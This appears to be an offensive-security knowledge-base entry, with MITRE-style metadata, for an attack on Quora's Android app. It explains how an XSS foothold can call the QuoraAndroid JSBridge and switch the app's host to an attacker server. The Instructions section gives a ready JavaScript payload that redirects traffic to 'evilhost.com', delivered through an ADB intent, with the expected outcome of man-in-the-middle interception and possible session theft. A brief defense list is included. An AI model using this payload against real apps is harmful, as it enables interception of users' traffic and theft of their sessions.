---
tags:
  - xss
  - jsbridge
  - mitm
type: procedure
tools:
  - '[[tools/ADB]]'
tactics:
  - '[[Collection]]'
commands: []
platforms:
  - Android
techniques:
  - '[[JavaScript]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: cb06b63c-a2a6-49f4-afeb-23c08d0f69d4
created_at: '2025-12-13T23:52:44.051Z'
updated_at: '2025-12-13T23:52:44.051Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Use-JSBridge-to-Switch-Instance-and-Redirect-to-Attacker-Host

## Summary

This procedure exploits XSS to manipulate Quora's JSBridge, sending a message to switch the app instance to an attacker-controlled host, enabling man-in-the-middle traffic interception.

## Description

Via injected script, call QuoraAndroid.sendMessage with JSON payload altering host, instance_name, and scheme. This redirects app communications. Requires XSS foothold; outcomes include traffic hijacking, extendable to session theft on Android WebViews.

## Requirements

1. Established XSS in any Quora activity
2. Attacker server ready (e.g., evilhost.com with HTTPS)
3. ADB for initial payload delivery

## Defense

Defensive measures and detection strategies:

- Secure JSBridge with method whitelisting and parameter validation
- Enforce HTTPS pinning to prevent host switches
- Detect anomalous sendMessage calls via native logging

## Objectives

1. Hijack app instance configuration
2. Redirect to malicious endpoint
3. Facilitate MITM for further exploitation

## Instructions

### Step 1: Inject JSBridge Manipulation Script

**Context**: Use XSS payload in an exported activity to send the reconfiguration message.

**Command** (JavaScript payload via html extra):
```javascript
QuoraAndroid.sendMessage(JSON.stringify({host: 'evilhost.com', instance_name: 'evilhost', scheme: 'https'}));
```

> Deliver via ADB intent (e.g., extend Step 1). Expected output: App reconfigures, requests hit evilhost.com.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/ADB]]

## Tags

- jsbridge
- mitm
